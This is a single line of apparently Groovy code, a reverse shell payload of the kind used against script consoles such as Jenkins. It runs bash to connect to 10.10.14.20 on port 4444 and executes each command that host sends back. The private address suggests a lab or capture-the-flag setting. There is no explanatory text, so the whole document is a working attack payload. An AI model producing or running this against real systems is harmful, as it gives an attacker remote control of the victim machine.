p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.20/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
